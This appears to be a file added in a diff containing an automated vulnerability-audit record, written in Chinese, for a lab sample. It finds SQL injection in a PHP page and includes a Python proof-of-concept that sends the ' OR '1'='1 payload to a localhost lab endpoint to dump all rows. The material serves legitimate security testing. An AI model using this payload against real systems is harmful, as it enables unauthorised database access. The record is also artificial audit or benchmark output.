@@ -1,0 +1,84 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": [
+    "F01:0007",
+    "F01:0010",
+    "F01:0011"
+  ],
+  "evidence": {
+    "source": "F01:0007 使用 $_GET['name'] 读取外部可控参数 name。",
+    "flow": "F01:0010 将 $name 直接拼接到 SQL 字符串 WHERE name = '...' 中。",
+    "guard": "无效：未使用预处理/绑定参数，也未使用 mysqli_real_escape_string 或白名单。",
+    "sink": "F01:0011 调用 $db->query($sql) 执行拼接后的 SQL。"
+  },
+  "prerequisites": [
+    "本地入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可访问",
+    "MariaDB 中 lab_people 表已预置 1 Alice、2 Bob、3 Carol",
+    "common/db_connect.php 提供已连接的 mysqli 变量 $db",
+    "无需登录"
+  ],
+  "missing_context": [
+    "未提供 common/db_connect.php 的具体实现；但页面内输入拼接与 query 执行点明确，且运行上下文声明 $db 已连接"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "在能访问 127.0.0.1:4280 的本地环境运行 python3 s001_poc.py。脚本仅请求 GET /lab_cases/S001/index.php?name=...。普通对照：name=Alice，预期正文包含 ID 1 和 Alice，且不包含 ID 2/ID 3；测试对照：name=' OR '1'='1（URL 编码后），预期正文包含 ID 1、ID 2、ID 3（或至少多出 Bob/Carol），说明 WHERE 条件被注入改变。不要以 HTTP 200 作为成功条件；失败时检查 db_connect.php 连接、MariaDB 服务、lab_people 表及预置数据，页面若显示“查询失败”则查看 error_log。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import sys
+import urllib.parse
+import urllib.request
+
+BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"
+
+
+def fetch(name: str) -> str:
+    query = urllib.parse.urlencode({"name": name})
+    url = f"{BASE}?{query}"
+    req = urllib.request.Request(url, headers={"User-Agent": "S001-audit-poc"})
+    with urllib.request.urlopen(req, timeout=10) as resp:
+        body = resp.read().decode("utf-8", "replace")
+    print(f"URL: {url}")
+    print(body[:500].replace("\n", " "))
+    return body
+
+
+def main() -> int:
+    normal = fetch("Alice")
+    payload = fetch("' OR '1'='1")
+
+    normal_ok = (
+        "ID 1" in normal
+        and "Alice" in normal
+        and "ID 2" not in normal
+        and "ID 3" not in normal
+    )
+    inject_ok = (
+        "ID 1" in payload
+        and "ID 2" in payload
+        and "ID 3" in payload
+    )
+
+    print("普通对照通过:", normal_ok)
+    print("注入对照通过:", inject_ok)
+
+    if normal_ok and inject_ok:
+        print("OBSERVED: 普通输入仅返回 Alice；测试输入返回全部预置记录，SQL 注入可复现。")
+        return 0
+
+    print("未观察到预期差异。请检查：服务/URL、db_connect.php、MariaDB、lab_people 预置数据、error_log；不要仅凭 HTTP 200 判断成功。")
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+```json
+{
